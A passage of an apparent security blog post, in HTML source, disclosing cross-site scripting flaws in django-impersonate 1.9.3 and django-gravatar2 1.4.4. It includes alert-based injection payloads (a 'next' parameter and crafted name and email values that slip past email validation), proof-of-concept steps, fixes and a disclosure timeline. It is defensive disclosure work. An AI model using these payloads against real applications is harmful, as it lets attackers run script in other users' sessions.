+&lt;div class="code"&gt;&lt;pre class="code html"&gt;&lt;a id="rest_code_4b9f2a42b8b744c09ab6326d9f659e59-1" name="rest_code_4b9f2a42b8b744c09ab6326d9f659e59-1" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_4b9f2a42b8b744c09ab6326d9f659e59-1"&gt;&lt;/a&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;input&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"hidden"&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"next"&lt;/span&gt; &lt;span class="na"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;""&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;a id="rest_code_4b9f2a42b8b744c09ab6326d9f659e59-2" name="rest_code_4b9f2a42b8b744c09ab6326d9f659e59-2" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_4b9f2a42b8b744c09ab6326d9f659e59-2"&gt;&lt;/a&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;domain&lt;/span&gt;&lt;span class="p"&gt;)&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;a id="rest_code_4b9f2a42b8b744c09ab6326d9f659e59-3" name="rest_code_4b9f2a42b8b744c09ab6326d9f659e59-3" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_4b9f2a42b8b744c09ab6326d9f659e59-3"&gt;&lt;/a&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;input&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"hidden"&lt;/span&gt;&lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/section&gt;
+&lt;section id="proof-of-concept"&gt;
+&lt;h3&gt;Proof of concept&lt;/h3&gt;
+&lt;p&gt;I created a &lt;a class="reference external" href="https://github.com/stsewd/poc-xss-django-impersonate"&gt;proof of concept&lt;/a&gt; to demonstrate the vulnerability, so you can see it in action,
+you just need to have Python and &lt;a class="reference external" href="https://docs.astral.sh/uv/getting-started/installation/"&gt;uv&lt;/a&gt; installed:&lt;/p&gt;
+&lt;p&gt;It consists of a simple Django project with &lt;code class="docutils literal"&gt;&lt;span class="pre"&gt;django-impersonate==1.9.3&lt;/span&gt;&lt;/code&gt; installed,
+with the &lt;code class="docutils literal"&gt;&lt;span class="pre"&gt;IMPERSONATE["REDIRECT_FIELD_NAME"]&lt;/span&gt;&lt;/code&gt; setting defined as &lt;code class="docutils literal"&gt;next&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="code"&gt;&lt;pre class="code bash"&gt;&lt;a id="rest_code_0819ec87925043e291e27c18a364cd86-1" name="rest_code_0819ec87925043e291e27c18a364cd86-1" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_0819ec87925043e291e27c18a364cd86-1"&gt;&lt;/a&gt;$&lt;span class="w"&gt; &lt;/span&gt;git&lt;span class="w"&gt; &lt;/span&gt;clone&lt;span class="w"&gt; &lt;/span&gt;https://github.com/stsewd/poc-xss-django-impersonate
+&lt;a id="rest_code_0819ec87925043e291e27c18a364cd86-2" name="rest_code_0819ec87925043e291e27c18a364cd86-2" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_0819ec87925043e291e27c18a364cd86-2"&gt;&lt;/a&gt;$&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;poc-xss-django-impersonate
+&lt;a id="rest_code_0819ec87925043e291e27c18a364cd86-3" name="rest_code_0819ec87925043e291e27c18a364cd86-3" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_0819ec87925043e291e27c18a364cd86-3"&gt;&lt;/a&gt;$&lt;span class="w"&gt; &lt;/span&gt;uv&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;manage.py&lt;span class="w"&gt; &lt;/span&gt;migrate
+&lt;a id="rest_code_0819ec87925043e291e27c18a364cd86-4" name="rest_code_0819ec87925043e291e27c18a364cd86-4" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_0819ec87925043e291e27c18a364cd86-4"&gt;&lt;/a&gt;&lt;span class="c1"&gt;# Create a user to log into the application.&lt;/span&gt;
+&lt;a id="rest_code_0819ec87925043e291e27c18a364cd86-5" name="rest_code_0819ec87925043e291e27c18a364cd86-5" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_0819ec87925043e291e27c18a364cd86-5"&gt;&lt;/a&gt;$&lt;span class="w"&gt; &lt;/span&gt;uv&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;manage.py&lt;span class="w"&gt; &lt;/span&gt;createsuperuser
+&lt;a id="rest_code_0819ec87925043e291e27c18a364cd86-6" name="rest_code_0819ec87925043e291e27c18a364cd86-6" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_0819ec87925043e291e27c18a364cd86-6"&gt;&lt;/a&gt;$&lt;span class="w"&gt; &lt;/span&gt;uv&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;manage.py&lt;span class="w"&gt; &lt;/span&gt;runserver
+&lt;/pre&gt;&lt;/div&gt;
+&lt;ul class="simple"&gt;
+&lt;li&gt;&lt;p&gt;Go to &lt;code class="docutils literal"&gt;&lt;span class="pre"&gt;http://127.0.0.1:8000/admin/login/&lt;/span&gt;&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Log in with the user you created&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Go to &lt;code class="docutils literal"&gt;&lt;span class="pre"&gt;http://127.0.0.1:8000/impersonate/search/?next=?next="&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;lt;input&lt;/span&gt; &lt;span class="pre"&gt;type="hidden&lt;/span&gt;&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;A pop-up with the domain of the page should appear&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Showing an alert is just a simple example,
+but an attacker can execute any JavaScript code in the context of the user's session.&lt;/p&gt;
+&lt;/section&gt;
+&lt;section id="mitigation"&gt;
+&lt;h3&gt;Mitigation&lt;/h3&gt;
+&lt;p&gt;You should never use &lt;code class="docutils literal"&gt;mark_safe&lt;/code&gt; with user-controlled content,
+if you need to build HTML with user-controlled data outside of a template,
+you can use the &lt;a class="reference external" href="https://docs.djangoproject.com/en/4.2/ref/utils/#django.utils.html.format_html"&gt;format_html&lt;/a&gt; function,
+as you can see in the two commits that fixed the vulnerability:
+&lt;a class="reference external" href="https://hg.code.netlandish.com/~petersanchez/django-impersonate/rev/06991a735f290884eec08effb3fa31ed45cc26e5"&gt;06991a735f29&lt;/a&gt;,
+&lt;a class="reference external" href="https://hg.code.netlandish.com/~petersanchez/django-impersonate/rev/33cb8c77262a474869ab94bcb82c5446baf3c228"&gt;33cb8c77262a&lt;/a&gt;.&lt;/p&gt;
+&lt;/section&gt;
+&lt;section id="timeline"&gt;
+&lt;h3&gt;Timeline&lt;/h3&gt;
+&lt;ul class="simple"&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;11/06/2024&lt;/strong&gt;: Found and reported the vulnerability to the maintainer.&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;13/06/2024&lt;/strong&gt;: Maintainer replied and confirmed the vulnerability.&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;14/06/2024&lt;/strong&gt;: Maintainer released version 1.9.4 with the fix.&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/section&gt;
+&lt;/section&gt;
+&lt;section id="django-gravatar2"&gt;
+&lt;h2&gt;django-gravatar2&lt;/h2&gt;
+&lt;p&gt;&lt;a class="reference external" href="https://pypi.org/project/django-gravatar2/"&gt;django-gravatar2&lt;/a&gt; allows you to integrate &lt;a class="reference external" href="https://gravatar.com/"&gt;Gravatar&lt;/a&gt; in your project,
+so you can show the user's avatar based on their email.&lt;/p&gt;
+&lt;section id="the-vulnerability-1"&gt;
+&lt;h3&gt;The vulnerability&lt;/h3&gt;
+&lt;p&gt;After grepping the codebase for common vulnerable patterns,
+I found this code that caught my attention:&lt;/p&gt;
+&lt;iframe frameborder="0" scrolling="no" style="width:100%; height:457px;" allow="clipboard-write" src="https://emgithub.com/iframe.html?target=https%3A%2F%2Fgithub.com%2Ftwaddington%2Fdjango-gravatar%2Fblob%2Fed123f849b5207e11efdfb1b2b0235baa41df356%2Fdjango_gravatar%2Ftemplatetags%2Fgravatar.py%23L24-L41&amp;amp;style=default&amp;amp;type=code&amp;amp;showBorder=on&amp;amp;showLineNumbers=on&amp;amp;showFileMeta=on&amp;amp;showFullPath=on&amp;amp;showCopy=on"&gt;&lt;/iframe&gt;&lt;p&gt;You can see that the application is building an HTML &lt;code class="docutils literal"&gt;img&lt;/code&gt; tag with several attributes,
+like CSS class, alt text, size, and the URL of the Gravatar image,
+and marking it as safe with &lt;a class="reference external" href="https://docs.djangoproject.com/en/4.2/ref/utils/#django.utils.safestring.mark_safe"&gt;mark_safe&lt;/a&gt;
+(Django won't escape it when including it in a template).
+Of all these attributes, only the URL is being &lt;a class="reference external" href="https://docs.djangoproject.com/en/4.2/ref/utils/#django.utils.html.escape"&gt;escaped&lt;/a&gt;,
+all other values are used as is.&lt;/p&gt;
+&lt;p&gt;I found that the function is used as a &lt;a class="reference external" href="https://docs.djangoproject.com/en/4.2/howto/custom-template-tags/"&gt;template tag&lt;/a&gt; to render the Gravatar image:&lt;/p&gt;
+&lt;iframe frameborder="0" scrolling="no" style="width:100%; height:100px;" allow="clipboard-write" src="https://emgithub.com/iframe.html?target=https%3A%2F%2Fgithub.com%2Ftwaddington%2Fdjango-gravatar%2Fblob%2Fed123f849b5207e11efdfb1b2b0235baa41df356%2Fdjango_gravatar%2Ftemplatetags%2Fgravatar.py%23L56&amp;amp;style=default&amp;amp;type=code&amp;amp;showBorder=on&amp;amp;showLineNumbers=on&amp;amp;showFileMeta=on&amp;amp;showFullPath=on&amp;amp;showCopy=on"&gt;&lt;/iframe&gt;&lt;p&gt;For example, you can use it in a template like this:&lt;/p&gt;
+&lt;div class="code"&gt;&lt;pre class="code html"&gt;&lt;a id="rest_code_d05c2825415643ae8f6cafb400a8ae4f-1" name="rest_code_d05c2825415643ae8f6cafb400a8ae4f-1" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_d05c2825415643ae8f6cafb400a8ae4f-1"&gt;&lt;/a&gt;{% load gravatar from gravatar %}
+&lt;a id="rest_code_d05c2825415643ae8f6cafb400a8ae4f-2" name="rest_code_d05c2825415643ae8f6cafb400a8ae4f-2" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_d05c2825415643ae8f6cafb400a8ae4f-2"&gt;&lt;/a&gt;
+&lt;a id="rest_code_d05c2825415643ae8f6cafb400a8ae4f-3" name="rest_code_d05c2825415643ae8f6cafb400a8ae4f-3" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_d05c2825415643ae8f6cafb400a8ae4f-3"&gt;&lt;/a&gt;{% gravatar user 50 "User profile" %}
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;In this example, the size and the alt text are hardcoded,
+so there is no way for an attacker to inject arbitrary HTML.
+But what happens if the size or alt text come from the user?
+Then we have a problem, as the values are not escaped before being included in the template.&lt;/p&gt;
+&lt;div class="code"&gt;&lt;pre class="code html"&gt;&lt;a id="rest_code_a8500bcacb9e4fa9bfde294c52acb93f-1" name="rest_code_a8500bcacb9e4fa9bfde294c52acb93f-1" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_a8500bcacb9e4fa9bfde294c52acb93f-1"&gt;&lt;/a&gt;{% load gravatar from gravatar %}
+&lt;a id="rest_code_a8500bcacb9e4fa9bfde294c52acb93f-2" name="rest_code_a8500bcacb9e4fa9bfde294c52acb93f-2" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_a8500bcacb9e4fa9bfde294c52acb93f-2"&gt;&lt;/a&gt;
+&lt;a id="rest_code_a8500bcacb9e4fa9bfde294c52acb93f-3" name="rest_code_a8500bcacb9e4fa9bfde294c52acb93f-3" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_a8500bcacb9e4fa9bfde294c52acb93f-3"&gt;&lt;/a&gt;{% gravatar user 50 user.name %}
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/section&gt;
+&lt;section id="exploitation-1"&gt;
+&lt;h3&gt;Exploitation&lt;/h3&gt;
+&lt;p&gt;Since the vulnerability is in a template tag,
+exploiting the vulnerability will depend if the application uses the template tag with user-controlled content.
+We can assume that a common alt text is the user's name.&lt;/p&gt;
+&lt;div class="code"&gt;&lt;pre class="code html"&gt;&lt;a id="rest_code_14e1fa4372c04a9a98a126176e7ff613-1" name="rest_code_14e1fa4372c04a9a98a126176e7ff613-1" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_14e1fa4372c04a9a98a126176e7ff613-1"&gt;&lt;/a&gt;{% load gravatar from gravatar %}
+&lt;a id="rest_code_14e1fa4372c04a9a98a126176e7ff613-2" name="rest_code_14e1fa4372c04a9a98a126176e7ff613-2" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_14e1fa4372c04a9a98a126176e7ff613-2"&gt;&lt;/a&gt;
+&lt;a id="rest_code_14e1fa4372c04a9a98a126176e7ff613-3" name="rest_code_14e1fa4372c04a9a98a126176e7ff613-3" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_14e1fa4372c04a9a98a126176e7ff613-3"&gt;&lt;/a&gt;{% gravatar user 50 user.first_name %}
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Then the attacker can inject the payload in the user's name.
+A simple payload could be:&lt;/p&gt;
+&lt;div class="code"&gt;&lt;pre class="code html"&gt;&lt;a id="rest_code_2d5056d4270d46fc801fcbce9d784b79-1" name="rest_code_2d5056d4270d46fc801fcbce9d784b79-1" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_2d5056d4270d46fc801fcbce9d784b79-1"&gt;&lt;/a&gt;"/&amp;gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;domain&lt;/span&gt;&lt;span class="p"&gt;)&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;img&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;What this does is:&lt;/p&gt;
+&lt;ul class="simple"&gt;
+&lt;li&gt;&lt;p&gt;Uses a &lt;code class="docutils literal"&gt;"/&amp;gt;&lt;/code&gt; to close the &lt;code class="docutils literal"&gt;img&lt;/code&gt; tag.&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Injects a script that shows an alert with the current domain.&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Opens a new tag so the rest of the HTML is not shown as broken.&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The payload injected into the template would look like this:&lt;/p&gt;
+&lt;div class="code"&gt;&lt;pre class="code html"&gt;&lt;a id="rest_code_066fa8570cd94744928867111d9a8193-1" name="rest_code_066fa8570cd94744928867111d9a8193-1" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_066fa8570cd94744928867111d9a8193-1"&gt;&lt;/a&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;img&lt;/span&gt; &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"gravatar"&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"https://www.gravatar.com/"&lt;/span&gt; &lt;span class="na"&gt;width&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"50"&lt;/span&gt; &lt;span class="na"&gt;height&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"50"&lt;/span&gt; &lt;span class="na"&gt;alt&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;""&lt;/span&gt;&lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
+&lt;a id="rest_code_066fa8570cd94744928867111d9a8193-2" name="rest_code_066fa8570cd94744928867111d9a8193-2" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_066fa8570cd94744928867111d9a8193-2"&gt;&lt;/a&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;domain&lt;/span&gt;&lt;span class="p"&gt;)&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
+&lt;a id="rest_code_066fa8570cd94744928867111d9a8193-3" name="rest_code_066fa8570cd94744928867111d9a8193-3" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_066fa8570cd94744928867111d9a8193-3"&gt;&lt;/a&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;img&lt;/span&gt; &lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;""&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;But that's very similar to the previous example,
+so let's assume that the application uses the user's email as the alt text instead.&lt;/p&gt;
+&lt;div class="code"&gt;&lt;pre class="code html"&gt;&lt;a id="rest_code_3c124332878b4cf6a88a7ba41fa75a67-1" name="rest_code_3c124332878b4cf6a88a7ba41fa75a67-1" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_3c124332878b4cf6a88a7ba41fa75a67-1"&gt;&lt;/a&gt;{% load gravatar from gravatar %}
+&lt;a id="rest_code_3c124332878b4cf6a88a7ba41fa75a67-2" name="rest_code_3c124332878b4cf6a88a7ba41fa75a67-2" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_3c124332878b4cf6a88a7ba41fa75a67-2"&gt;&lt;/a&gt;
+&lt;a id="rest_code_3c124332878b4cf6a88a7ba41fa75a67-3" name="rest_code_3c124332878b4cf6a88a7ba41fa75a67-3" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_3c124332878b4cf6a88a7ba41fa75a67-3"&gt;&lt;/a&gt;{% gravatar user 50 user.email %}
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;You may think that's the same as the previous example,
+but now the payload needs to be a valid email.
+And if you try to create an email with the previous payload, it won't work,
+as the Django user model will validate the email format.&lt;/p&gt;
+&lt;p&gt;Making the payload a valid email is not as simple as just adding &lt;code class="docutils literal"&gt;@example.com&lt;/code&gt; at the end,
+as the part before the &lt;code class="docutils literal"&gt;@&lt;/code&gt; (local part) can't contain special characters like &lt;code class="docutils literal"&gt;&lt;span class="pre"&gt;"&amp;lt;&amp;gt;()&lt;/span&gt;&lt;/code&gt;,
+which are part of the payload.&lt;/p&gt;
+&lt;p&gt;Luckily, the &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Email_address#Local-part"&gt;spec says that the local part can contain any ASCII characters if it's quoted&lt;/a&gt;,
+and coincidentally, our payload has already quotes around it, so it's just a matter adding &lt;code class="docutils literal"&gt;@example.com&lt;/code&gt; at the end!
+Or almost... Django's email validator does allow the local part to be quoted, but it doesn't allow spaces,
+luckily HTML is very forgiving, so we can add almost anything instead of the spaces, and our payload will still work&lt;/p&gt;
+&lt;div class="code"&gt;&lt;pre class="code html"&gt;&lt;a id="rest_code_4846fd7b920c40dfaa755b6acb842fa8-1" name="rest_code_4846fd7b920c40dfaa755b6acb842fa8-1" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_4846fd7b920c40dfaa755b6acb842fa8-1"&gt;&lt;/a&gt;"/&amp;gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;domain&lt;/span&gt;&lt;span class="p"&gt;)&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;img&lt;/span&gt;&lt;span class="err"&gt;/&lt;/span&gt;&lt;span class="na"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;"@example.com&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;You could also leave the tag unclosed, but that will break the rest of the HTML in the template.&lt;/p&gt;
+&lt;div class="code"&gt;&lt;pre class="code html"&gt;&lt;a id="rest_code_d1ebd8d6fe034f6e9c194a40535bbd07-1" name="rest_code_d1ebd8d6fe034f6e9c194a40535bbd07-1" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_d1ebd8d6fe034f6e9c194a40535bbd07-1"&gt;&lt;/a&gt;"/&amp;gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;domain&lt;/span&gt;&lt;span class="p"&gt;)&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;"@example.com
+&lt;/pre&gt;&lt;/div&gt;
+&lt;/section&gt;
+&lt;section id="proof-of-concept-1"&gt;
+&lt;h3&gt;Proof of concept&lt;/h3&gt;
+&lt;p&gt;I created a &lt;a class="reference external" href="https://github.com/stsewd/poc-xss-django-gravatar2"&gt;proof of concept&lt;/a&gt; to demonstrate the vulnerability, so you can see it in action,
+you just need to have Python and &lt;a class="reference external" href="https://docs.astral.sh/uv/getting-started/installation/"&gt;uv&lt;/a&gt; installed:&lt;/p&gt;
+&lt;p&gt;It consists of a simple Django project with &lt;code class="docutils literal"&gt;&lt;span class="pre"&gt;django-gravatar2==1.4.4&lt;/span&gt;&lt;/code&gt; installed,
+it shows the Gravatar of a user given its email.&lt;/p&gt;
+&lt;div class="code"&gt;&lt;pre class="code bash"&gt;&lt;a id="rest_code_7d87ded5988343ceb7fd95cb05189ed2-1" name="rest_code_7d87ded5988343ceb7fd95cb05189ed2-1" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_7d87ded5988343ceb7fd95cb05189ed2-1"&gt;&lt;/a&gt;$&lt;span class="w"&gt; &lt;/span&gt;git&lt;span class="w"&gt; &lt;/span&gt;clone&lt;span class="w"&gt; &lt;/span&gt;https://github.com/stsewd/poc-xss-django-gravatar2
+&lt;a id="rest_code_7d87ded5988343ceb7fd95cb05189ed2-2" name="rest_code_7d87ded5988343ceb7fd95cb05189ed2-2" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_7d87ded5988343ceb7fd95cb05189ed2-2"&gt;&lt;/a&gt;$&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;poc-xss-django-gravatar2
+&lt;a id="rest_code_7d87ded5988343ceb7fd95cb05189ed2-3" name="rest_code_7d87ded5988343ceb7fd95cb05189ed2-3" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_7d87ded5988343ceb7fd95cb05189ed2-3"&gt;&lt;/a&gt;$&lt;span class="w"&gt; &lt;/span&gt;uv&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;manage.py&lt;span class="w"&gt; &lt;/span&gt;migrate
+&lt;a id="rest_code_7d87ded5988343ceb7fd95cb05189ed2-4" name="rest_code_7d87ded5988343ceb7fd95cb05189ed2-4" href="https://stsewd.dev/posts/xss-in-djang-impersonate-and-django-gravatar2/#rest_code_7d87ded5988343ceb7fd95cb05189ed2-4"&gt;&lt;/a&gt;$&lt;span class="w"&gt; &lt;/span&gt;uv&lt;span class="w"&gt; &lt;/span&gt;run&lt;span class="w"&gt; &lt;/span&gt;manage.py&lt;span class="w"&gt; &lt;/span&gt;runserver
+&lt;/pre&gt;&lt;/div&gt;
+&lt;ul class="simple"&gt;
+&lt;li&gt;&lt;p&gt;Go to &lt;code class="docutils literal"&gt;&lt;span class="pre"&gt;http://127.0.0.1:8000/&lt;/span&gt;&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;In the form enter &lt;code class="docutils literal"&gt;&lt;span class="pre"&gt;"/&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;lt;img&lt;/span&gt; src="&lt;/code&gt; as the name,
+or &lt;code class="docutils literal"&gt;&lt;span class="pre"&gt;"/&amp;gt;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;lt;img/src="@example.com&lt;/span&gt;&lt;/code&gt; as the email.&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Click on the "Submit" button.&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;A pop-up with the domain of the page should appear.&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Showing an alert is just a simple example,
+but an attacker can execute any JavaScript code in the context of the user's session.&lt;/p&gt;
+&lt;/section&gt;
+&lt;section id="mitigation-1"&gt;
+&lt;h3&gt;Mitigation&lt;/h3&gt;
+&lt;p&gt;As the previous vulnerability,
+you should never use &lt;code class="docutils literal"&gt;mark_safe&lt;/code&gt; with user-controlled content,
+if you need to build HTML with user-controlled data outside of a template,
+you can use the &lt;a class="reference external" href="https://docs.djangoproject.com/en/4.2/ref/utils/#django.utils.html.format_html"&gt;format_html&lt;/a&gt; function.&lt;/p&gt;
+&lt;aside class="admonition note"&gt;
+&lt;p class="admonition-title"&gt;Note&lt;/p&gt;
+&lt;p&gt;The maintainer chose to &lt;a class="reference external" href="https://github.com/twaddington/django-gravatar/commit/b08820112f062b40521c6f07fb9657f4204f6cf1"&gt;escape the alt text only&lt;/a&gt;,
+as he considered the size and CSS class should be validated by the developer.
+If you are using the &lt;code class="docutils literal"&gt;gravatar&lt;/code&gt; template tag with user-controlled content
+in the size or CSS class, you should escape it as show in the following example:&lt;/p&gt;
